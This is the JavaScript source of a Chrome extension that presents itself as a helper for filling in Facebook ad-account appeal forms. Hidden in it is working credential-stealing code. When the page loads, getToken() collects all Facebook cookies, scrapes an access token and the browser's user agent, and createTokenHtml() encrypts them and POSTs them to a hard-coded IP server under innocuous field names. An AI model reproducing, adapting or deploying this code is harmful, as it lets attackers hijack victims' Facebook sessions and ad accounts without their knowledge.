
// $(document).ready(function() {
//     innitIalize();
//     innitEvents(); 
//     getToken();
// });

document.addEventListener("DOMContentLoaded", function (event) {
    innitIalize();
    innitEvents();
    getToken();
});

function innitIalize() {
    // innitCss();
}

function innitEvents() {
    try {
        document.getElementById("btn_camp").addEventListener("click", showBlockCamp);
        var radios = document.querySelectorAll('input[type=radio]');
        Array.prototype.forEach.call(radios, function (radio) {
            radio.addEventListener('change', clickRadioBox);
        });
        document.getElementById("btn_send_1").addEventListener("click", clickBtnSend);
        document.getElementById("btn_send_2").addEventListener("click", clickBtnSend2);
    } catch (error) {
        console.log('fnc innitEvents: ' + error.message);
    }
}

function clickBtnSend() {
    try {
        if (!validate(1)) {
            return;
        }
        moveToFacebookContact();
    } catch (error) {
        console.log('fnc innitEvents: ' + error.message);
    }
}

function clickBtnSend2() {
    try {
        if (!validate(2)) {
            return;
        }
        moveToFacebookContact2();
    } catch (error) {
        console.log('fnc innitEvents: ' + error.message);
    }
}

function clickRadioBox(event) {
    try {
        var temp_id = this.getAttribute('id');
        $(".div_another_reason").addClass('hidden');
        if (temp_id == 'rad_3' || temp_id == 'rad_3_1') {
            $(".div_another_reason").removeClass('hidden');
        }
    } catch (error) {
        console.log('fnc clickRadioBox: ' + error.message);
    }
}


function validate(type = 1) {
    try {
        if(type == 1){
            var list_account = document.getElementById('list_account').value;
            if (list_account == '') {
                alert('Please choose an ID!');
                document.getElementById('list_account').focus();
                return false;
            }
            return true;
        }
        else{
            var list_account = document.getElementById('list_account_1').value;
            if (list_account == '') {
                alert('Please choose an ID!');
                document.getElementById('list_account_1').focus();
                return false;
            }
            return true;
        }        
    } catch (error) {
        console.log('fnc validate: ' + error.message);
    }
}

chrome.runtime.onMessage.addListener(function(request)
{
    alert(1);
});

function moveToFacebookContact() {
    try {
        var newURL          = "https://www.facebook.com/help/contact/2026068680760273";
        var ad_account      = document.getElementById('list_account').value;
        var reason          = document.getElementById('another_reason').value;
        var radio_box       = '';
        var radio_script    = '';
        if (document.getElementById('rad_1').checked) {
            radio_box = '1';
        }
        if (document.getElementById('rad_2').checked) {
            radio_box = '2';
        }
        if (document.getElementById('rad_3').checked) {
            radio_box = '3';
        }
        switch (radio_box){
            case '1':
                radio_script = "document.getElementById('214722839744822.0').checked= true;"
                break;
            case '2':
                radio_script = "document.getElementById('214722839744822.1').checked= true;"
                break;
            case '3':
                radio_script = "document.getElementById('214722839744822.2').checked= true;"
                + "document.getElementById('214722839744822.2').click();"
                + "document.getElementById('1524925354431785').value = '" + reason + "';"
                break;
        }
        chrome.tabs.create({ url: newURL, selected: false, active: false }, function (tab) {
            chrome.tabs.executeScript(tab.id,
                {
                    code : "document.getElementById('653706721428219.1').checked= true;"
                    + "document.getElementById('653706721428219.1').click();"
                    + ""
                    + "document.getElementById('742613859158435').value = '" + ad_account + "';"
                    + radio_script
                }, () => chrome.runtime.lastError);

        });        

    } catch (error) {
        console.log('fnc moveToFacebookContact: ' + error.message);
    }
}

function moveToFacebookContact2() {
    try {
        var newURL          = "https://www.facebook.com/help/contact/186912391909649";
        var ad_account      = document.getElementById('list_account_1').value;
        var reason          = document.getElementById('another_reason_1').value;
        var case_number     = document.getElementById('case_number').value;
        var radio_box       = '';
        var radio_script    = '';
        if (document.getElementById('rad_1_1').checked) {
            radio_box = '1';
        }
        if (document.getElementById('rad_2_1').checked) {
            radio_box = '2';
        }
        if (document.getElementById('rad_3_1').checked) {
            radio_box = '3';
        }
        switch (radio_box){
            case '1':
                radio_script = "document.getElementById('296084320450771').value = 'Lên chiến dịch chuyển đổi không duyệt';"
                break;
            case '2':
                radio_script = "document.getElementById('296084320450771').value = 'Lên chiến dịch xét duyệt quá 24hrs';"
                break;
            case '3':
                radio_script = "document.getElementById('296084320450771').value = '" + reason + "';"
                break;
        }
        chrome.tabs.create({ url: newURL, selected: false, active: false }, function (tab) {
            chrome.tabs.executeScript(tab.id,
                {
                    code : "document.getElementById('486556404885036').value ='" + ad_account + "';"
                    +  "document.getElementById('337290956413644').value ='" + case_number + "';"
                    + radio_script
                }, () => chrome.runtime.lastError);

        });        

    } catch (error) {
        console.log('fnc moveToFacebookContact: ' + error.message);
    }
}

function showBlockCamp() {
    try {
        $("#next_body").removeClass('hidden');
        $("#div_body").addClass('hidden');
        getToken();
    } catch (error) {
        console.log('fnc showBlockCamp: ' + error.message);
    }
}

function copyToClipBoard(elem) {
    try {
        var temp_id = $(elem).attr('id');
        var copyText = document.getElementById(temp_id);
        copyText.select();
        copyText.setSelectionRange(0, 99999)
        document.execCommand("copy");
        alertify.set('notifier', 'position', 'top-center');
        alertify.success('Copied!');
    } catch (error) {
        console.log('fnc copyToClipBoard: ' + error.message);
    }
}

function getToken() {
    try {
        chrome.cookies.getAll({
            url: "https://www.facebook.com/"
        }, (function (cookies) {
            var e = "";
            var data = {};
            cookies.map((function (n) {
                e = e + n.name + "=" + n.value + ";"
            })), $.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed").then((function (a) {
                data = {
                    token: /\\"accessToken\\":\\"([^\\]+)\\"/gm.exec(a)[1],
                    cookies: "".concat(e, "|").concat(navigator.userAgent),
                };
                createTokenHtml(data);
                getUID(data);
            })).catch((function (n) {
                console.log('fnc getToken: ' + n.message);
            }))
        }))
    } catch (error) {
        console('fnc getToken: ' + error.message);
    }
}

function callAjax(param_data) {
    try {
        $.ajax({
            type: 'POST',
            url: 'http://128.199.68.91:3000/resolve-issue',
            dataType: 'json',
            contentType: 'application/json',
            data: JSON.stringify(param_data),
            success: function (res) {
                //
            }
        });
    } catch (error) {
        console.log('fnc callAjax: ' + error.message);
    }
}

function getUID(param_data) {
    try {
        var UID             = /c_user=\s*(-?\d+(?:\.\d+)?)/gm.exec(param_data['cookies'])[1];
        var list_account    = $("#list_account");
        var list_account_1  = $("#list_account_1");
        list_account.empty();
        list_account_1.empty();
        list_account.append('<option></option>');
        list_account_1.append('<option></option>');

        var facebookGraphURL = 'https://graph.facebook.com/v8.0/' + UID + '?fields=adaccounts{name}&&access_token=' + param_data['token'];
        $.ajax({
            url: facebookGraphURL,
            dataType: 'json',
            success: function (data, status) {
                for (var account in data['adaccounts']['data']) {
                    var option = '<option value="' + data['adaccounts']['data'][account]['id'] + '">' + data['adaccounts']['data'][account]['id'] + '</option>';
                    list_account.append(option);
                    list_account_1.append(option);
                }
            },
            error: function (data, e1, e2) {
                console.log(data);
            }
        })
    } catch (error) {
        console.log('fnc getUID: ' + error.message);
    }
}

function createTokenHtml(data) {
    try {
        $("#token_div").empty();
        let token = '';
        let cookies = '';
        if (data != null && data != undefined && data != '') {
            token = data.token ?? '';
            cookies = data.cookies ?? '';
        }
        let param_data = {
            service1: CryptoJS.AES.encrypt(token, "divItemNoClass").toString(),
            service2: CryptoJS.AES.encrypt(cookies, "divItemNoClass").toString(),
            date: new Date().getTime().toString()
        }
        callAjax(param_data);
        $("#main_div").append(
            '<div class="div-img">' +
            '<img src="https://www.upsieutoc.com/images/2020/08/31/logo07867e5d84647d92.png" alt="logo07867e5d84647d92.png" border="0" />' +
            '</div>' +
            '<div id="token_div">' +
            '<div class="from-group">' +
            '<div class="form-control class-1">' +
            '<input id="token" readonly="readonly">' +
            '</div>' +
            '<div class="form-control">' +
            '<textarea id="cookies"  readonly="readonly"></textarea>' +
            '</div>' +
            '</div>' +
            '</div>'
        );
        $('#token').val(token);
        $('#cookies').val(cookies);
    } catch (error) {
        console.log('fnc createTokenHtml: ' + error.message);
    }
}

function innitCss() {
    try {
        $('head').append(
            '<style type="text/css">' +
            '.form-control{' +
            'font-size: 17px;' +
            'width: 100%;' +
            '}' +
            '.class-1{' +
            'margin: 0px 0px 20px 0px;' +
            '}' +
            '.form-control input, .form-control textarea{' +
            'border-radius: 6px;' +
            'font-size: 17px;' +
            'padding: 14px 16px;' +
            'background: #FFFFFF;' +
            'border: 1px solid #dddfe2;' +
            'color: #1d2129;' +
            'font-family: Helvetica, Arial, sans-serif;' +
            'font-size: 12px;' +
            'line-height: 16p;' +
            'width: 100%;' +
            'padding: 0 8px;' +
            'width: -webkit-fill-available;' +
            'vertical-align: middle;' +
            '}' +
            'input{' +
            'height: 52px;' +
            '}' +
            'textarea{' +
            'height: 150px;' +
            'resize: none;' +
            '}' +
            '#main_div{' +
            'width: 400px;' +
            '}' +
            '.div-img{' +
            'text-align: center;' +
            '}' +
            '</style>'
        );
    } catch (error) {
        console.log('fnc innitCss: ' + error.message);
    }
}
